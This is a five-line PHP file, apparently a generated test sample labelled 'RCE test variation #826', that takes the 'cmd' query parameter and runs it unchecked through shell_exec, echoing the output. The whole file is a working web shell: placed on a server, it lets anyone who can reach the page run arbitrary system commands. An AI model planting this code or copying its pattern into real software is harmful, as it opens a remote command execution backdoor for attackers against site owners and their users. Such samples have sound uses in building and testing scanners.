<?php
// RCE test variation #826
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>